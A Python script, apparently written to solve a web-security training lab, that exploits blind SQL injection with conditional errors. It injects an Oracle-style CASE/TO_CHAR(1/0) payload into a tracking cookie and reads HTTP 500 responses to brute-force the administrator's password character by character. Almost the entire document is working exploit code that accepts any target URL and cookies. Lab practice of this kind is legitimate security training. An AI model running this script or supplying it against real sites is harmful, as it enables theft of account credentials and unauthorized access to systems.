# Lab: Blind SQL injection with conditional errors
# PRACTITIONER

# This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
# The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.
# The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.
# To solve the lab, log in as the administrator user. 

import urllib3
import urllib
import requests
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
Burpsuite = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'} 

def Sqli_Blind_Conditional_Errors(Url,Cookie_1,Cookie_2):
    Contraseña_Obtenida = ""
    for Longitud in range(1,21):
        for Caracter in range(32,126):
            Payload = "' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and ascii(substr(password,%s,1))='%s') || '" % (Longitud,Caracter)
            Payload_Codificado = urllib.parse.quote(Payload)
            Cookies_Payload = {'TrackingId': f'{Cookie_1}' + Payload_Codificado, 'session': f'{Cookie_2}'}
            Solicitud_Web = requests.get(Url, cookies=Cookies_Payload, verify=False, proxies=Burpsuite)
            if Solicitud_Web.status_code == 500:
                Contraseña_Obtenida += chr(Caracter)
                sys.stdout.write('\r' + Contraseña_Obtenida)
                sys.stdout.flush()
                break
            else:
                sys.stdout.write('\r' + Contraseña_Obtenida + chr(Caracter))
                sys.stdout.flush()

def main():
    if len(sys.argv) != 4:
        print('[-] Uso: %s <url> <Cookie TrackingId> <Cookie Session> ' %sys.argv[0])
        print('[-] Ejemplo: %s www.ejemplo.com 7fq9WzFMIndKgMgb kyxgl6V3LwOoThuTOqPTX7Nyfr3qjyGD')
        sys.exit(-1)

    Url = sys.argv[1]
    Cookie_1 = sys.argv[2]
    Cookie_2 = sys.argv[3]
    print("Obteniendo la contraseña del usuario admnistrator...")
    Sqli_Blind_Conditional_Errors(Url, Cookie_1, Cookie_2)

if __name__ == "__main__":
    main()
